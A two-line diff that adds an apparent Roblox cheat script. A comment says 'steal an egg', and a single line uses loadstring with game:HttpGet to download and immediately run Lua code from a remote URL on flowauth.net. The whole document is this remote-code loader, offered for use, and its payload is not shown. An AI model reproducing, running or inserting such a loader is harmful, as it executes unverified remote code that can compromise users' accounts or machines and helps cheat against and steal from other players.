@@ -1,0 +1,2 @@
+--steal an egg
+loadstring(game:HttpGet("https://flowauth.net/v1/loaders/3c4e87ed34813171b0f8d53a108a7d88.lua"))()
